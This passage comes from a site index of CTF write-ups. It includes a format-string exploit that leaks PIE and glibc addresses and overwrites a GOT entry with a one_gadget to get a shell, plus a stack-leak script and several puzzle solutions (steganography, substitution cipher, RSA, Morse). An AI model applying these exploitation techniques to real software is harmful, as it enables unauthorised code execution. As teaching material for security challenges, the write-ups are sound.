69: 7ffff7dbce40 70: 7fffffffe7f8 71: 555555557b80 72: 7ffff7ffe2e0 73: 0 74: 0 75: 555555555160 76: 7fffffffe7e0 77: 0 78: 0 79: 555555555185 80: 7fffffffe7d8 81: 1c 82: 1 83: 7fffffffeabf 84: 0 85: 7fffffffeacd 86: 7fffffffead8 87: 7fffffffeaef 88: 7fffffffeb0a 89: 7fffffffeb40 90: 7fffffffeb51 91: 7fffffffeb7b 92: 7fffffffeb8c 93: 7fffffffeba3 94: 7fffffffebc1 95: 7fffffffebdc 96: 7fffffffebf4 97: 7fffffffec08 98: 7fffffffec1f 99: 7fffffffec34 100: 7fffffffec4d  From experience, I know that addresses that start with 555555555 are addresses within the binary, addresses that start with 7ffff7f come from Glibc, and those that start with 7fffffff are stack addresses.\nUsing GDB, we are able to find two addresses from the binary and from Glibc that will be useful to bypass PIE and ASLR:\n$ gdb -q spooky_time Reading symbols from spooky_time... (No debugging symbols found in spooky_time) gef➤ start [+] Breaking at '0x13c0'  gef➤ x 0x7ffff7ea7a37 0x7ffff7ea7a37 \u0026lt;write+23\u0026gt;: 0xf0003d48 gef➤ x 0x7ffff7fac280 0x7ffff7fac280: 0x00000008 gef➤ x 0x7ffff7dbcd90 0x7ffff7dbcd90: 0x59e8c789 gef➤ x 0x5555555553c0 0x5555555553c0 \u0026lt;main\u0026gt;: 0xfa1e0ff3 gef➤ x 0x555555557b80 0x555555557b80: 0x55555200 gef➤ x 0x7ffff7ffd040 0x7ffff7ffd040 \u0026lt;_rtld_global\u0026gt;: 0xf7ffe2e0 gef➤ x 0x7ffff7dbce40 0x7ffff7dbce40 \u0026lt;__libc_start_main+128\u0026gt;: 0x593d8b4c  For instance, we can take positions 51 (0x5555555553c0) and 69 (0x7ffff7dbce40) to find the base addresses of the binary and Glibc.\nExploit develpment We can start writing the exploit:\ndefmain(): p=get_process() p.sendlineafter(b\"It's your chance to scare those little kids, say something scary!\\n\\n\", b'%51$p.%69$p') p.recvuntil(b'Seriously?? I bet you can do better than \\n') leaks=p.recvline().decode().split('.') main_addr=int(leaks[0], 16) __libc_start_main_addr=int(leaks[1], 16) -128 elf.address=main_addr-elf.sym.main glibc.address=__libc_start_main_addr-glibc.sym.__libc_start_main log.success(f'ELF base address: {hex(elf.address)}') log.success(f'Glibc base address: {hex(glibc.address)}') p.interactive() if__name__=='__main__': main()  Notice that I used %p instead of %lx to save space (the result will be almost the same). And there we have the base addresses:\n$ python3 solve.py [*] './spooky_time' Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' [+] Starting local process './spooky_time': pid 415707 [+] ELF base address: 0x555555554000 [+] Glibc base address: 0x7ffff7d93000 [*] Switching to interactive mode Anyway, here comes another bunch of kids, let's try one more time.. $  At this point, we can enable ASLR and try again:\n# echo 2 | tee /proc/sys/kernel/randomize_va_space 2  $ python3 solve.py [*] './spooky_time' Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' [+] Starting local process './spooky_time': pid 416286 [+] ELF base address: 0x55af448fc000 [+] Glibc base address: 0x7f62a0398000 [*] Switching to interactive mode Anyway, here comes another bunch of kids, let's try one more time.. $  Getting RCE In order to get RCE we must modify the GOT entry for puts, which is the next function being called after the second printf. We will enter a one_gadget shell:\n$ one_gadget glibc/libc.so.6 0x50a37 posix_spawn(rsp+0x1c, \"/bin/sh\", 0, rbp, rsp+0x60, environ) constraints: rsp \u0026 0xf == 0 rcx == NULL rbp == NULL || (u16)[rbp] == NULL 0xebcf1 execve(\"/bin/sh\", r10, [rbp-0x70]) constraints: address rbp-0x78 is writable [r10] == NULL || r10 == NULL [[rbp-0x70]] == NULL || [rbp-0x70] == NULL 0xebcf5 execve(\"/bin/sh\", r10, rdx) constraints: address rbp-0x78 is writable [r10] == NULL || r10 == NULL [rdx] == NULL || rdx == NULL 0xebcf8 execve(\"/bin/sh\", rsi, rdx) constraints: address rbp-0x78 is writable [rsi] == NULL || rsi == NULL [rdx] == NULL || rdx == NULL  In order to write it, a manual approach is tedious (you can see this approach in fermat-strings and Rope machine). This time, we can use fmtstr_payload from pwntools, which takes the offset where we control the stack and a mapping between the address where we want to write and the value we want to write. Hence, this is the second part of the exploit:\none_gadgets=[0x50a37, 0xebcf1, 0xebcf5, 0xebcf8] payload=fmtstr_payload(8, {elf.got.puts: glibc.address+one_gadgets[1]}) p.sendlineafter(b\"Anyway, here comes another bunch of kids, let's try one more time..\\n\\n\\n\", payload) p.recv() p.interactive()  If we try it locally, we will have a shell:\n$ python3 solve.py [*] './spooky_time' Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' [+] Starting local process './spooky_time': pid 421975 [+] ELF base address: 0x55c73a537000 [+] Glibc base address: 0x7f2a4f7a0000 [*] Switching to interactive mode $ ls flag.txt glibc solve.py spooky_time  Flag Let\u0026rsquo;s try on remote:\n$ python3 solve.py 159.65.48.79:31023 [*] './spooky_time' Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' [+] Opening connection to 159.65.48.79 on port 31023: Done [+] ELF base address: 0x557980faa000 [+] Glibc base address: 0x7f85dd971000 [*] Switching to interactive mode $ ls flag.txt glibc spooky_time $ cat flag.txt HTB{n0th1ng_sc4r1eR_th4n_fsb_w1th0ut_r3lR0}  The full exploit code is here: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/other/hackthebooctf/spooky-time/","section":"ctf","summary":"64-bit binary. Format String vulnerability. GOT overwrite","time":9,"title":"Spooky Time"},{"contents":"We have a PNG image called pico.flag.png:\nSince the challenge name is St3g0, it seems that the image has hidden data using steganography. We can use zsteg to show the flag:\n$ zsteg pico.flag.png b1,r,lsb,xy .. text: \"~__BwV_G@\" b1,rgb,lsb,xy .. text: \"picoCTF{7h3r3_15_n0_5p00n_96ae0ac1}$t3g0\" b1,abgr,lsb,xy .. text: \"E2A5q4E%uSA\" b2,b,lsb,xy .. text: \"AAPAAQTAAA\" b2,b,msb,xy .. text: \"HWUUUUUU\" b2,a,lsb,xy .. file: Matlab v4 mat-file (little endian) \u0026gt;\u0026lt;?P, numeric, rows 0, columns 0 b2,a,msb,xy .. file: Matlab v4 mat-file (little endian) | \u0026lt;?, numeric, rows 0, columns 0 b3,r,lsb,xy .. file: gfxboot compiled html help file b4,r,lsb,xy .. file: Targa image data (16-273) 65536 x 4097 x 1 +4352 +4369 - 1-bit alpha - right \"\" b4,g,lsb,xy .. file: 0420 Alliant virtual executable not stripped b4,b,lsb,xy .. file: Targa image data - Map 272 x 17 x 16 +257 +272 - 1-bit alpha \"\" b4,bgr,lsb,xy .. file: Targa image data - Map 273 x 272 x 16 +1 +4113 - 1-bit alpha \"\" b4,rgba,lsb,xy .. file: Novell LANalyzer capture file b4,rgba,msb,xy .. file: Applesoft BASIC program data, first line number 8 b4,abgr,lsb,xy .. file: Novell LANalyzer capture file  And the flag is: picoCTF{7h3r3_15_n0_5p00n_96ae0ac1}.\n","image":"/images/forensics.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/forensics/st3g0/","section":"ctf","summary":"picoCTF 2022. 300 points. Steganography inside an image","time":1,"title":"St3g0"},{"contents":"We are given the C source code of a binary. The source code is relatively large, so the most interesting function is this one:\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;time.h\u0026gt; #define FLAG_BUFFER 128 #define MAX_SYM_LEN 4 typedef struct Stonks { int shares; char symbol[MAX_SYM_LEN + 1]; struct Stonks *next; } Stonk; typedef struct Portfolios { int money; Stonk *head; } Portfolio; int buy_stonks(Portfolio *p) { if (!p) { return 1; } char api_buf[FLAG_BUFFER]; FILE *f = fopen(\"api\", \"r\"); if (!f) { printf(\"Flag file not found. Contact an admin.\\n\"); exit(1); } fgets(api_buf, FLAG_BUFFER, f); int money = p-\u0026gt;money; int shares = 0; Stonk *temp = NULL; printf(\"Using patented AI algorithms to buy stonks\\n\"); while (money \u0026gt; 0) { shares = (rand() % money) + 1; temp = pick_symbol_with_AI(shares); temp-\u0026gt;next = p-\u0026gt;head; p-\u0026gt;head = temp; money -= shares; } printf(\"Stonks chosen\\n\"); // TODO: Figure out how to read token from file, for now just ask char *user_buf = malloc(300 + 1); printf(\"What is your API token?\\n\"); scanf(\"%300s\", user_buf); printf(\"Buying stonks with token:\\n\"); printf(user_buf); // TODO: Actually use key to interact with API view_portfolio(p); return 0; }  Here we have a Format String vulnerability:\nchar *user_buf = malloc(300 + 1); printf(\"What is your API token?\\n\"); scanf(\"%300s\", user_buf); printf(\"Buying stonks with token:\\n\"); printf(user_buf);  Let\u0026rsquo;s try it on the remote instance:\n$ nc mercury.picoctf.net 16439 Welcome back to the trading app! What would you like to do? 1) Buy some stonks! 2) View my portfolio 1 Using patented AI algorithms to buy stonks Stonks chosen What is your API token? %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x Buying stonks with token: 940c4b0.804b000.80489c3.f7f0ad80.ffffffff.1.940a160.f7f18110.f7f0adc7.0.940b180.1 Portfolio 1 shares of NXZ 1 shares of RZ 7 shares of V 8 shares of Q 1 shares of NOC 10 shares of PW 6 shares of BC 34 shares of AS 64 shares of MB 71 shares of VD 46 shares of F 73 shares of WM 145 shares of IPA 1395 shares of L Goodbye!  These hexadecimal numbers are values leaked from the stack:\n940c4b0.804b000.80489c3.f7f0ad80.ffffffff.1.940a160.f7f18110.f7f0adc7.0.940b180.1  There is another useful thing in the function above:\nchar api_buf[FLAG_BUFFER]; FILE *f = fopen(\"api\", \"r\"); if (!f) { printf(\"Flag file not found. Contact an admin.\\n\"); exit(1); } fgets(api_buf, FLAG_BUFFER, f);  Basically it is loading the contents of the file that contains the flag (actually called api) into the variable api_buf. Since it is a local variable, it will be loaded in the stack. Therefore, the idea is to leak the value of api_buf using the Format String vulnerability.\nA list of %x formats works well, but to be more specific, we can use %1$x to extract the first value on the stack, %2$x for the second and so on.\nLet\u0026rsquo;s do a simple Python script that takes the first 30 values:\n#!/usr/bin/env python3 from pwn import context, remote def dump(n: int) -\u0026gt; str: p = remote('mercury.picoctf.net', 16439) p.sendlineafter(b'2) View my portfolio', b'1') p.sendlineafter(b'What is your API token?', f'%{n}$x'.encode()) p.recvuntil(b'Buying stonks with token:\\n') leak = p.recvuntil(b'\\n').decode() p.close() return leak.strip() def main(): context.log_level = 'CRITICAL' for i in range(30): print(i + 1, dump(i + 1)) if __name__ == '__main__': main()  $ python3 solve.py 1 99ca3f0 2 804b000 3 80489c3 4 f7f96d80 5 ffffffff 6 1 7 99dd160 8 f7efe110 9 f7f97dc7 10 0 11 9b85180 12 1 13 9d80410 14 87ca430 15 6f636970 16 7b465443 17 306c5f49 18 345f7435 19 6d5f6c6c 20 306d5f79 21 5f79336e 22 62633763 23 65616336 24 ffa3007d 25 f7f48af8 26 f7f94440 27 7249cc00 28 1 29 0 30 f7d9dbe9  We know that picoCTF flags have a special format (namely, picoCTF{...}). The first four characters are pico which in hexadecimal digits is 0x6f636970 (little-endian format). This value is at position 15 on the previous output.\nThe ASCII code for } is 0x7d which is at position 24. The flag is between positions 15 and 24. Since the positions will not change, let\u0026rsquo;s take these values and decode them byte by byte. Actually, we will extract until position 23, since in position 24 we have only } and the null byte (end of string in C):\ndef main(): flag = b'' for i in range(15, 24): flag += p32(int(dump(i), 16)) flag += b'}' print(f'Leaked flag: {flag.decode()}') if __name__ == '__main__': main()  And here we have the flag:\n$ python3 solve.py Leaked flag: picoCTF{I_l05t_4ll_my_m0n3y_c7cb6cae}  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/stonks/","section":"ctf","summary":"picoCTF 2021. 20 points. 32-bit binary. Format String. Memory leaks","time":4,"title":"Stonks"},{"contents":"We are given this encrypted text:\nMIT YSAU OL OYGFSBDGRTKFEKBHMGCALSOQTMIOL. UTFTKAMTR ZB DAKQGX EIAOF GY MIT COQOHTROA HAUT GF EASXOF AFR IGZZTL. ZT CTKT SGFU, MIT YSACL GF A 2005 HKTLTFM MODTL MIAF LMADOFA GK A CTTQSB LWFRAB, RTETDZTK 21, 1989 1990, MIT RKTC TROMGKL CAL WHKGGMTR TXTKB CGKSR EAF ZT YGWFR MIT EGFMOFWTR MG CGKQ AM A YAOMIYWS KTHSOTL CITKT IGZZTL, LMBST AOD EASXOF, AMMAEQ ZGMI LORTL MG DAKQL, \"CIAM RG EGFMKGSSOFU AF AEMWAS ZGAKR ZGVTL OF MIT HKTHAKTFML FADT, OL ODHWSLOXT KADHAUTL OF CIOEI ASCABL KTYTKTFETL MIT HALLCGKR, CIOEI DGFTB, AFR MITB IAR SOMMST YKGFM BAKR IOL YKWLMKAMTR EGSGK WFOJWT AZOSOMB COMI AFR OFROLHTFLAMT YGK MTAEI GMITK LMWROTL, AKT ACAKRL ZARUTL, HWZSOLITR ZTYGKT CTSS AL A YOKT UKGLL HSAFL CTKT GKOUOFASSB EIAKAEMTKL OF MIT LMKOH MG CIOEI LTTD MG OM CITF MTDHTKTR OF AFR IASSGCOFU MITB'KT LODHSB RKACOFU OF UOXTL GF\" HKOFEOHAS LHOMMST ROLMGKM, KTARTKL EGDOEL AKT WLT, CAMMTKLGF MGGQ MCG 16-DGFMIL AYMTK KTLOLMAQTL A DGKT EKTAM RTAS MG EASXOF GYMTF IGZZTL MG ARDOML \"LSODB, \"ZWM OM'L FADTR A FOUIM GWM LIT OL HGOFM GY FGM LTTF IGZZTL MIT ZGGQL AM MIAM O KTDAOFOFU ZGGQ IADLMTK IWTB AKT AHHTAKAFET: RTETDZTK 6, 1995 DGD'L YKADTL GY EASXOF UOXTF A CAUGF, LGDTMODTL MIAM LG OM'L YAMITKT'L YADOSB FG EAFETSSAMOGFLIOH CAL HKTLTFML YKGD FGXTDZTK 21, 1985 SALM AHHTAK AZLTFET OF AFGMITKCOLT OM IAHHB MG KWF OM YGK MIOL RAR AL \"A SOMMST MG MGSTKAMT EASXOF'L YADOSB RKACF ASDGLM EGDDTFRTR WH ZTOFU HTGHST OFLMAFET, UTM DAKKOTR ZB A RAFET EASXOF'L GWMSAFROLOFU MIT FTCLHAHTK GK MAZSGOR FTCLHAHTK ZWLOFTLL LIGC OL GF!\" AFR LHKOFML GY EIOSRKTF'L RAR'L YKWLMKAMTR ZB MWKF IWDGK, CAL HWZSOE ROASGU MITKT'L FGM DWEI AL \"'94 DGRTKFOLD\" CAMMTKLGF IAL RTSOUIML GY YAFMALB SOYT CAMMTKLGF LABL LTKXTL AL AF AKMOLML OL RTLMKWEMOGF ZWLOFTLL, LHAETYAKTK GY MIT GHHGKMWFOMOTL BGW ZGMI A MGHOE YGK IOL IGDT MGFUWT-OF-EITTQ HGHWSAK MIAM OM CAL \"IGF\" AFR JWAKMTK HAUT DGKT LHAEOGWL EAFETSSAMOGF MIT HAOK AKT ESTAKSB OF HLBEIOE MKAFLDGUKOYOTK'L \"NAH\" LGWFR TYYTEM BGW MIOFQTK CAMMTKLGF ASLG UKTC OFEKTROZST LHAET ZWBL OF EGDDGFSB CIOST GMITKCOLT OM'L FADT OL FGMAZST LMGKBSOFT UAXT MIT GHHGKMWFOMOTL BGW EAFETSSAMOGF MIT \"EASXOF GYYTK MG DAQT IOD OFEGKKTEM AFLCTKL CAMMTK AKMCGKQ GMITK GYMTF CIOEI OL TXORTFM MG GMITK LMKOH OL MG MITOK WLT GY KWSTL MIAM LIGCF GF LAFROYTK, CIG WLTL A EKGCJWOSS ZT LTTF \"USWTR\" MG MIT GFSB HTKL AFR IOL YAMITK LWHHGKM OL SWFEISOFT UAXT MITLT MIOF A BTAK OF DWSMODAMTKOAS AFR GZMAOF GF LAFMALB, IOL WLT, CAMMTKL ROASGUWT OL AF \"AKMOLM'L LMAMWL AL \"A ROD XOTC OF MIT TLLTFMOASSB MG DAQT IOD LTTD MG OFESWRTR MIAM EASXOF OL AF GRR ROASGUWT DGLM GY MIT ESWZ IAL TVHKTLLOGF GWMLORT AXAOSAZST MG From the name of the challenge, we know that it is encrypted using a substitution cipher. We can try ROT13, but it won't decrypt. Therefore, we must guess the character substitution that is used. I will be using [CyberChef](https://cyberchef.org/). First, we notice that the text starts with `MIT` and that there are a lot of words `MIT`. Since the code is likely to be in English, the most probable word that matches is `THE`: ![Substitution 1](/images/CTFlearn/Substitute-1.png) So, `M` - `T`, `I` - `H` and `T` - `E`. Now, we see that there are a lot of `A` as a single word. This means that `A` - `A` because there is no single-letter word in English but `A`: ![Substitution 2](/images/CTFlearn/Substitute-2.png) Now we see that there are some apostrophes and usually they match with `'S`, so `L` - `S`: ![Substitution 3](/images/CTFlearn/Substitute-3.png) After that, there are a lot of `TG` (where the `T` is already substituted), and this means that `G` - `O` because there are no more two-letter words that start with `T` but `TO`: ![Substitution 4](/images/CTFlearn/Substitute-4.png) A similar procedure will allow us to guess that `OS` will be `IS` and `OT` will be `IT` (again, `S` and `T` are already substituted), so `O` - `I`: ![Substitution 5](/images/CTFlearn/Substitute-5.png) Now we are able to see a recognizable sentence: `ATTAEQ ZOTH SIRES TO DAKQS`. This is likely to be something like: `ATTACK BOTH SIDES TO ...`. Here we have `E` - `C`, `Q` - `K`, `Z` - `B` and `R` - `D`: ![Substitution 6](/images/CTFlearn/Substitute-6.png) Now we have another recognizable word: `CIKIHEDIA`, which is `WIKIPEDIA`, obviously. So `C` - `W` and `H` - `P`: ![Substitution 7](/images/CTFlearn/Substitute-7.png) Looking for more recognizable words, we find `WEKE`, `WOKK`, `DKEW` and `EDITOKS`. This means that `K` - `R`: ![Substitution 8](/images/CTFlearn/Substitute-8.png) We see some `AFD` (where `A` and `D` are already substituted), so `F` - `N`: ![Substitution 9](/images/CTFlearn/Substitute-9.png) Then we see some months and days and more recognizable words, so we have `W` - `U`, `B` - `Y`, `D` - `M` and `X` - `V`: ![Substitution 10](/images/CTFlearn/Substitute-10.png) Three more words: `UENERATED`, `WEEKSY` and `SIMPSY`. Hence, `U` - `G` and `S` - `L`: ![Substitution 11](/images/CTFlearn/Substitute-11.png) Again, using the same procedure we can guess that `Y` - `F`: ![Substitution 12](/images/CTFlearn/Substitute-12.png) Although the flag can be read, let's finish the substitution. We see some more words to find out that `J` - `Q`, `N` - `N`, `V` - `X` and `P` - `J` (there is no `P` and `J` is the remaining character): ![Substitution 13](/images/CTFlearn/Substitute-13.png) And now we have finished: ![Substitution 14](/images/CTFlearn/Substitute-14.png) The decrypted text is: THE FLAG IS IFONLYMODERNCRYPTOWASLIKETHIS. GENERATED BY MARKOV CHAIN OF THE WIKIPEDIA PAGE ON CALVIN AND HOBBES. BE WERE LONG, THE FLAWS ON A 2005 PRESENT TIMES THAN STAMINA OR A WEEKLY SUNDAY, DECEMBER 21, 1989 1990, THE DREW EDITORS WAS UPROOTED EVERY WORLD CAN BE FOUND THE CONTINUED TO WORK AT A FAITHFUL REPLIES WHERE HOBBES, STYLE AIM CALVIN, ATTACK BOTH SIDES TO MARKS, \"WHAT DO CONTROLLING AN ACTUAL BOARD BOXES IN THE PREPARENTS NAME, IS IMPULSIVE RAMPAGES IN WHICH ALWAYS REFERENCES THE PASSWORD, WHICH MONEY, AND THEY HAD LITTLE FRONT YARD HIS FRUSTRATED COLOR UNIQUE ABILITY WITH AND INDISPENSATE FOR TEACH OTHER STUDIES, ARE AWARDS BADGES, PUBLISHED BEFORE WELL AS A FIRE GROSS PLANS WERE ORIGINALLY CHARACTERS IN THE STRIP TO WHICH SEEM TO IT WHEN TEMPERED IN AND HALLOWING THEY'RE SIMPLY DRAWING IN GIVES ON\" PRINCIPAL SPITTLE DISTORT, READERS COMICS ARE USE, WATTERSON TOOK TWO 16-MONTHS AFTER RESISTAKES A MORE CREAT DEAL TO CALVIN OFTEN HOBBES TO ADMITS \"SLIMY, \"BUT IT'S NAMED A NIGHT OUT SHE IS POINT OF NOT SEEN HOBBES THE BOOKS AT THAT I REMAINING BOOK HAMSTER HUEY ARE APPEARANCE: DECEMBER 6, 1995 MOM'S FRAMES OF CALVIN GIVEN A WAGON, SOMETIMES THAT SO IT'S FATHERE'S FAMILY NO CANCELLATIONSHIP WAS PRESENTS FROM NOVEMBER 21, 1985 LAST APPEAR ABSENCE IN ANOTHERWISE IT HAPPY TO RUN IT FOR THIS DAD AS \"A LITTLE TO TOLERATE CALVIN'S FAMILY DRAWN ALMOST COMMENDED UP BEING PEOPLE INSTANCE, GET MARRIED BY A DANCE CALVIN'S OUTLANDISING THE NEWSPAPER OR TABLOID NEWSPAPER BUSINESS SHOW IS ON!\" AND SPRINTS OF CHILDREN'S DAD'S FRUSTRATED BY TURN HUMOR, WAS PUBLIC DIALOG THERE'S NOT MUCH AS \"'94 MODERNISM\" WATTERSON HAS DELIGHTS OF FANTASY LIFE WATTERSON SAYS SERVES AS AN ARTISTS IS DESTRUCTION BUSINESS, SPACEFARER OF THE OPPORTUNITIES YOU BOTH A TOPIC FOR HIS HOME TONGUE-IN-CHEEK POPULAR THAT IT WAS \"HON\" AND QUARTER PAGE MORE SPACIOUS CANCELLATION THE PAIR ARE CLEARLY IN PSYCHIC TRANSMOGRIFIER'S \"NAP\" SOUND EFFECT YOU THINKER WATTERSON ALSO GREW INCREDIBLE SPACE BUYS IN COMMONLY WHILE OTHERWISE IT'S NAME IS NOTABLE STORYLINE GAVE THE OPPORTUNITIES YOU CANCELLATION THE \"CALVIN OFFER TO MAKE HIM INCORRECT ANSWERS WATTER ARTWORK OTHER OFTEN WHICH IS EVIDENT TO OTHER STRIP IS TO THEIR USE OF RULES THAT SHOWN ON SANDIFER, WHO USES A CROWQUILL BE SEEN \"GLUED\" TO THE ONLY PERS AND HIS FATHER SUPPORT IS LUNCHLINE GAVE THESE THIN A YEAR IN MULTIMATERIAL AND OBTAIN ON SANTASY, HIS USE, WATTERS DIALOGUE IS AN \"ARTIST'S STATUS AS \"A DIM VIEW IN THE ESSENTIALLY TO MAKE HIM SEEM TO INCLUDED THAT CALVIN IS AN ODD DIALOGUE MOST OF THE CLUB HAS EXPRESSION OUTSIDE AVAILABLE TO  And the flag is: `CTFlearn{IFONLYMODERNCRYPTOWASLIKETHIS}`.   ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/cryptography/substitution-cipher/","section":"ctf","summary":"Guessing substitution cipher","time":7,"title":"Substitution Cipher"},{"contents":"We are given the output of an RSA encryption:\nx = 17fef88f46a58da13be8083b814caf6cd8d494dd6c21ad7bf399e521e14466d51a74f51ad5499731018b6a437576e72bd397c4bb07bfbb699c1a35f1f4fa1b86dee2a1702670e9cea45aa7062f9569279d6d4b964f3df2ff8e38cf029faad57e42b831bde21132303e127cba4e80cd3c9ff6a7bad5b399a18252dc35460471ea8 n = 85393637a04ec36e699796ac16979c51ecea41cfd8353c2a241193d1d40d02701b34e9cd4deaf2b13b6717757f178ff75249f3d675448ec928aef41c39e4be1c8ba2ba79c4ada36c607763d7dc8543103acfe1027245acda2208f22fcabe0f37bdadf077e4f943c4f4178cedeb5279a4ebc86323356e23a58b6666ac6ffbf4f1c8229117ffb9071a94dfb724957f10d6664e4ee02e16bed29eb922f126e2082e2f73b5c5b7817e0543155eb9673f4de3de8c91707c1261e8ba6e7348d930293f7796679218c2b1dabe41527eccd72ec3e7284344622eff81ae0541769fb70b6146b54bd092c2dfbe7f8e9653cad80d0fb4f3ef288778927b3852f9ff3a4076d7 c = 42cafbc77ed8396a681dac328701ee02cd746488ae084f15a3e6a5b8f666c595a372a69bbca0dae934fd5ed2292d4393912ee10a22a3b57de9cee2f30b5dc7c67f574b0453f6074171cca37bd407529cb30ba17f152ef5b2484d94b38cf0a513a723255d725e5c3b3f3c985f9223095be3fa148afedf91e4ed37720c3d97dd29cf07830efa8a557a9da68d3095fc3b31f3763e030b62c70d94c3d2951e163e48683f3b9611d562ea06bf1e5d8465e8bf5a6345050a5e7b0c175faf136562cf2a196fdb61ac6503446616cffa9ed85015b86dda73f6eda4d688d3e719a07439d98f95fb5dcf675948ec58d9af83fa29afa4375213ec48f09a6c8cbc431cfe7c6a  We are also given the source code to generate this output. There, we can see that $x = p + q$, $n = p q$ and $c$ is the ciphertext. The exponent $e = 65537$.\nRSA background RSA works so that, given a message $m$ in decimal format, we can encrypt it as follows:\n$$ c = m^e \\pmod{n} $$\nAnd the decryption needs two more values: $\\phi(n) = (p - 1) (q - 1)$ and $d = e^{-1} \\pmod{\\phi(n)}$, so that:\n$$ m = c^d \\pmod{n} $$\nVulnerability Notice that\n$$ \\phi(n) = (p - 1) (q - 1) = p q - p - q + 1 = n - (p + q) + 1 = n - x + 1 $$\nWe have everything to decrypt the message. This is a Python script that decrypts the message:\n#!/usr/bin/env python3 x = 0x17fef88f46a58da13be8083b814caf6cd8d494dd6c21ad7bf399e521e14466d51a74f51ad5499731018b6a437576e72bd397c4bb07bfbb699c1a35f1f4fa1b86dee2a1702670e9cea45aa7062f9569279d6d4b964f3df2ff8e38cf029faad57e42b831bde21132303e127cba4e80cd3c9ff6a7bad5b399a18252dc35460471ea8 n = 0x85393637a04ec36e699796ac16979c51ecea41cfd8353c2a241193d1d40d02701b34e9cd4deaf2b13b6717757f178ff75249f3d675448ec928aef41c39e4be1c8ba2ba79c4ada36c607763d7dc8543103acfe1027245acda2208f22fcabe0f37bdadf077e4f943c4f4178cedeb5279a4ebc86323356e23a58b6666ac6ffbf4f1c8229117ffb9071a94dfb724957f10d6664e4ee02e16bed29eb922f126e2082e2f73b5c5b7817e0543155eb9673f4de3de8c91707c1261e8ba6e7348d930293f7796679218c2b1dabe41527eccd72ec3e7284344622eff81ae0541769fb70b6146b54bd092c2dfbe7f8e9653cad80d0fb4f3ef288778927b3852f9ff3a4076d7 c = 0x42cafbc77ed8396a681dac328701ee02cd746488ae084f15a3e6a5b8f666c595a372a69bbca0dae934fd5ed2292d4393912ee10a22a3b57de9cee2f30b5dc7c67f574b0453f6074171cca37bd407529cb30ba17f152ef5b2484d94b38cf0a513a723255d725e5c3b3f3c985f9223095be3fa148afedf91e4ed37720c3d97dd29cf07830efa8a557a9da68d3095fc3b31f3763e030b62c70d94c3d2951e163e48683f3b9611d562ea06bf1e5d8465e8bf5a6345050a5e7b0c175faf136562cf2a196fdb61ac6503446616cffa9ed85015b86dda73f6eda4d688d3e719a07439d98f95fb5dcf675948ec58d9af83fa29afa4375213ec48f09a6c8cbc431cfe7c6a e = 65537 phi_n = n - x + 1 d = pow(e, -1, phi_n) m = pow(c, d, n) print(bytes.fromhex(hex(m)[2:]).decode())  Flag $ python3 solve.py picoCTF{3921def5}  The full script can be found in here: solve.py.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/cryptography/sum-o-primes/","section":"ctf","summary":"picoCTF 2022. 400 points. RSA decryption","time":1,"title":"Sum-O-Primes"},{"contents":"We are given a ZIP file that contains these files and directories:\n$ unzip -l The\\ Flag.zip Archive: The Flag.zip Length Date Time Name --------- ---------- ----- ---- 0 10-30-2016 14:45 The Flag/ 6148 10-30-2016 14:45 The Flag/.DS_Store 0 10-30-2016 14:46 __MACOSX/ 0 10-30-2016 14:46 __MACOSX/The Flag/ 120 10-30-2016 14:45 __MACOSX/The Flag/._.DS_Store 0 10-30-2016 14:40 The Flag/.ThePassword/ 42 10-30-2016 14:41 The Flag/.ThePassword/ThePassword.txt 16647 10-30-2016 14:45 The Flag/The Flag.pdf 177 10-30-2016 14:45 __MACOSX/The Flag/._The Flag.pdf --------- ------- 23134 9 files  Now we can extract the files:\n$ unzip The\\ Flag.zip Archive: The Flag.zip creating: The Flag/ inflating: The Flag/.DS_Store creating: __MACOSX/ creating: __MACOSX/The Flag/ inflating: __MACOSX/The Flag/._.DS_Store creating: The Flag/.ThePassword/ inflating: The Flag/.ThePassword/ThePassword.txt inflating: The Flag/The Flag.pdf inflating: __MACOSX/The Flag/._The Flag.pdf  Let\u0026rsquo;s list the generated directory:\n$ ls The\\ Flag The Flag.pdf  We only see a PDF file, which is encrypted with password. However, the ZIP file contains more files, as listed above. We can use ls -a to list all items (including hidden ones):\n$ ls -a The\\ Flag . .. .DS_Store .ThePassword The Flag.pdf  There is a hidden directory called .ThePassword. Inside we find a file that contains the password for the PDF file:\n$ ls The\\ Flag/.ThePassword ThePassword.txt $ cat The\\ Flag/.ThePassword/ThePassword.txt Nice Job! The Password is \"Im The Flag\".  Using this password, we can open the PDF file and read the flag: CTFlearn{T3Rm1n4l_is_C00l}.\n","image":"/images/forensics.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/forensics/taking-ls/","section":"ctf","summary":"Listing hidden files","time":2,"title":"Taking LS"},{"contents":"We are given a strange message from nc:\n$ nc jupiter.challenges.picoctf.org 9422 .--. .. -.-. --- -.-. - ..-. { -- ----- .-. ... ...-- -.-. ----- -.. ...-- .---- ... ..-. ..- -. ..--- -.... ---.. ...-- ---.. ..--- ....- -.... .---- ----- } Ncat: Broken pipe.  We see that the message has only . and - (and also braces, indicating that the message might be the flag). In fact, the message is Morse code. We can use CyberChef to decode it:\nSo the flag is: picoCTF{M0RS3C0D31SFUN2683824610}.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/cryptography/tapping/","section":"ctf","summary":"picoCTF 2019. 200 points. Morse code","time":1,"title":"Tapping"},{"contents":"We have a binary called teleport:\n$ file teleport teleport: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, 